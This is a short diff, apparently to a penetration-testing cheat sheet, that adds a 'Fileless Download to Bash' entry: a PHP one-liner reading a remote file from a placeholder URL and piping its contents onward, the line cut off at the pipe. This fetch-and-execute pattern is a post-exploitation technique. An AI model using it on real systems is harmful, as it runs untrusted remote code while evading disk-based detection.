@@ -25,3 +25,6 @@ php -r 'const BUFFER = 1024; $fremote = fopen("<URL TO FILE>", "rb"); $flocal = 
 ```
 
 #### Fileless Download to Bash
+```bash
+php -r '$lines = @file("<URL TO FILE>"); foreach ($lines as $line_num => $line) { echo $line; }' | 
+```
